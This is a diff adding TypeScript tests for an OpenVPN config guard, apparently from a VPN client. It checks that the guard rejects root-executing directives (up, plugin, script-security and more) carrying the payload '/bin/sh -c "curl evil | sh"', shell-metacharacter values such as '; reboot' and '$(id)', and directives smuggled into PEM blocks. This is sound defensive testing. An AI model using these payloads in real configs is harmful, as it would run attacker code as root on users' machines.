@@ -16,6 +16,8 @@ import {
   isSafeNodeApiUrl,
   assertSafeHysteria2Config,
   assertSafeAmneziaWgConfig,
+  assertSafeOpenVpnConfig,
+  extractOpenVpnRemoteHost,
 } from './config-guard.ts'
 
 // A representative clean WireGuard config built from a node handshake.
@@ -456,4 +458,125 @@ test('assertSafeAmneziaWgConfig rejects signature packets outside the tag gramma
 test('assertSafeWireguardConfig still rejects AmneziaWG keys (allow-lists stay separate)', () => {
   const wgWithJc = CLEAN_WG.replace('MTU = 1420', 'Jc = 4')
   assert.throws(() => assertSafeWireguardConfig(wgWithJc), /"jc".*not allowed/)
+})
+
+// --- OpenVPN config guard ---
+
+// A representative clean config as openvpn-config.ts builds it (PEM bodies
+// shortened — the guard checks shape, not cryptographic validity).
+const CLEAN_OVPN = `client
+dev sntl-ovpn
+dev-type tun
+proto udp
+remote 203.0.113.10 1194
+nobind
+auth-nocache
+auth SHA256
+data-ciphers AES-256-GCM:AES-128-GCM
+data-ciphers-fallback AES-256-GCM
+tls-cipher TLS-ECDHE-ECDSA-WITH-AES-256-GCM-SHA384
+tls-client
+tls-version-min 1.2
+remote-cert-tls server
+redirect-gateway def1 ipv6 bypass-dhcp
+topology subnet
+explicit-exit-notify 1
+persist-key
+persist-tun
+
+<ca>
+-----BEGIN CERTIFICATE-----
+MIIBizCCATGgAwIBAgIUJRlanpHf774AH9U8QVutSO9eKu4wCgYIKoZIzj0EAwIw
+-----END CERTIFICATE-----
+</ca>
+<cert>
+-----BEGIN CERTIFICATE-----
+MIIBfjCCASOgAwIBAgIUFLHnWPS7pvYXkZ2qdzUfJJNPlAwwCgYIKoZIzj0EAwIw
+-----END CERTIFICATE-----
+</cert>
+<key>
+-----BEGIN PRIVATE KEY-----
+MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQg0cApCgzxt44Fs/VV
+-----END PRIVATE KEY-----
+</key>
+<tls-crypt>
+-----BEGIN OpenVPN Static key V1-----
+8fb4e3efd49b79d59624c1ddc5b0669b
+-----END OpenVPN Static key V1-----
+</tls-crypt>
+`
+
+test('assertSafeOpenVpnConfig accepts a builder-produced config', () => {
+  assert.doesNotThrow(() => assertSafeOpenVpnConfig(CLEAN_OVPN))
+})
+
+// OpenVPN's root-exec surface. Every one of these runs a command as root (or
+// re-enables the ones that do), and is rejected by omission from the allow-list.
+for (const directive of [
+  'up', 'down', 'route-up', 'route-pre-down', 'ipchange', 'client-connect',
+  'client-disconnect', 'tls-verify', 'auth-user-pass-verify', 'learn-address',
+  'plugin', 'script-security', 'setenv', 'cd', 'chroot', 'daemon', 'writepid',
+  'log', 'log-append', 'status', 'management', 'config', 'askpass', 'dev-node',
+  'mode', 'tls-server', 'auth-user-pass', 'ca', 'cert', 'key',
+]) {
+  test(`assertSafeOpenVpnConfig rejects ${directive}`, () => {
+    const evil = CLEAN_OVPN.replace('nobind', `${directive} /bin/sh -c "curl evil | sh"`)
+    assert.throws(() => assertSafeOpenVpnConfig(evil), /not allowed/)
+  })
+}
+
+test('assertSafeOpenVpnConfig rejects a script directive appended after the PKI blocks', () => {
+  assert.throws(() => assertSafeOpenVpnConfig(`${CLEAN_OVPN}up /bin/sh\n`), /"up" is not allowed/)
+})
+
+test('assertSafeOpenVpnConfig pins the interface, transport and topology', () => {
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('dev sntl-ovpn', 'dev sntl0')), /"dev" has a malformed/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('dev-type tun', 'dev-type tap')), /"dev-type" has a malformed/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('proto udp', 'proto sctp')), /"proto" has a malformed/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('remote-cert-tls server', 'remote-cert-tls client')), /"remote-cert-tls" has a malformed/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('tls-version-min 1.2', 'tls-version-min 1.0')), /"tls-version-min" has a malformed/)
+})
+
+test('assertSafeOpenVpnConfig rejects shell metacharacters in a permitted value', () => {
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('remote 203.0.113.10 1194', 'remote 203.0.113.10; reboot 1194')), /"remote" has a malformed/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('auth SHA256', 'auth $(id)')), /"auth" has a malformed/)
+})
+
+test('assertSafeOpenVpnConfig rejects a second remote the kill switch would not whitelist', () => {
+  const twoRemotes = CLEAN_OVPN.replace('nobind', 'remote 198.51.100.9 443\nnobind')
+  assert.throws(() => assertSafeOpenVpnConfig(twoRemotes), /"remote" is repeated/)
+})
+
+test('assertSafeOpenVpnConfig rejects unknown or repeated inline blocks', () => {
+  const evil = CLEAN_OVPN.replace('<ca>', '<tls-auth>\n-----BEGIN OpenVPN Static key V1-----\ndeadbeef\n-----END OpenVPN Static key V1-----\n</tls-auth>\n<ca>')
+  assert.throws(() => assertSafeOpenVpnConfig(evil), /<tls-auth> is not allowed/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN + '<ca>\ndeadbeef\n</ca>\n'), /<ca> is repeated/)
+})
+
+test('assertSafeOpenVpnConfig rejects a directive smuggled inside an inline block', () => {
+  const evil = CLEAN_OVPN.replace(
+    '-----END CERTIFICATE-----\n</ca>',
+    '-----END CERTIFICATE-----\nup /bin/sh\n</ca>',
+  )
+  assert.throws(() => assertSafeOpenVpnConfig(evil), /non-PEM line/)
+})
+
+test('assertSafeOpenVpnConfig rejects an unterminated block', () => {
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('</tls-crypt>', '')), /unterminated/)
+})
+
+test('assertSafeOpenVpnConfig requires the full PKI and the client essentials', () => {
+  for (const tag of ['ca', 'cert', 'key', 'tls-crypt']) {
+    const without = CLEAN_OVPN.replace(new RegExp(`<${tag}>[\\s\\S]*?</${tag}>\\n`), '')
+    assert.throws(() => assertSafeOpenVpnConfig(without), new RegExp(`<${tag}> is missing`))
+  }
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('client\n', '')), /"client" is missing/)
+  assert.throws(() => assertSafeOpenVpnConfig(CLEAN_OVPN.replace('remote 203.0.113.10 1194\n', '')), /"remote" is missing/)
+})
+
+test('extractOpenVpnRemoteHost reads the endpoint host for the kill switch', () => {
+  assert.equal(extractOpenVpnRemoteHost(CLEAN_OVPN), '203.0.113.10')
+  assert.equal(extractOpenVpnRemoteHost('remote [2001:db8::1] 1194'), '2001:db8::1')
+  assert.equal(extractOpenVpnRemoteHost('remote node.example.com 443'), 'node.example.com')
+  assert.equal(extractOpenVpnRemoteHost('client\ndev sntl-ovpn'), null)
 })
